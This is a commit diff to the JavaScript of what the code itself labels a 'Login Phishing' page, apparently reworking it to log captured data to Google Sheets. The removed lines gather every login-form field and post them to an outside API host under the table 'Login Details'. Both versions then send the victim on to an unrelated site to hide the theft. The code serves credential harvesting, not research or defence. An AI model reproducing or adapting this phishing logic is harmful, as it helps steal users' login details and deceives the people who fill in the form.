0756492b4ac9c6016fed6decafcdacbafc5ce0a4
unknown <prashikdeshpande24@gmail.com>
2022-06-06 09:33:16 +0530

    Updated to SHEETS API

--- js/main.js
+++ js/main.js
@@ -9,60 +9,21 @@ function validate() {
         }
     } else {
         alert('Invalid email. Please enter again!');
+        return false;
     }
 
     return true;
 }
 
+const form = document.getElementById('test-form');
 
-document.getElementById('submit-form').addEventListener('click', (e) => {
-    if (validate() == true) {
-        e.preventDefault();
+const delay = ms => new Promise(res => setTimeout(res, ms));
 
-        const form = document.getElementById('test-form');
-        const formData = new FormData(form);
 
-        let formJSON = {};
-
-        for (const [key, value] of formData.entries()) {
-            formJSON[key] = value;
-        }
-
-        var putReqStr = createPUTRequest("90938734|-31948832731587922|90946266", JSON.stringify(formJSON), "Login Phishing", "Login Details");
-        console.log(putReqStr);
-        $.ajaxSetup({
-            async: false,            
-        });
-        var resultObj = executeCommandAtGivenBaseUrl(putReqStr, "http://api.login2explore.com:5577", "/api/iml");
-        $.ajaxSetup({
-            async: true
-        });
-
-        console.log('success');
-        document.getElementById('test-form').reset();
-        window.location.replace("https://www.lovecalculator.com/");
+form.addEventListener('submit', (e) => {
+    if (validate()) {   
+        form.reset();
+        window.location.replace("https://www.lovecalculator.com/");        
     }
 });
 
-
-// $('#submit-form').on('click', function (e) {
-//     console.log('clicked on submit');
-
-//     if (validate() == true) {
-
-//         e.preventDefault();
-//         const test_form = document.getElementById('test-form');
-//         const formData = new FormData(test_form);
-//         let jsonObject = {};
-
-//         for (const [key, value] of formData.entries()) {
-//             jsonObject[key] = value;
-//         }
-//         console.log('data is ', jsonObject);
-
-
-//         
-
-//     } // include after the sheets issue is handled
-
-// })
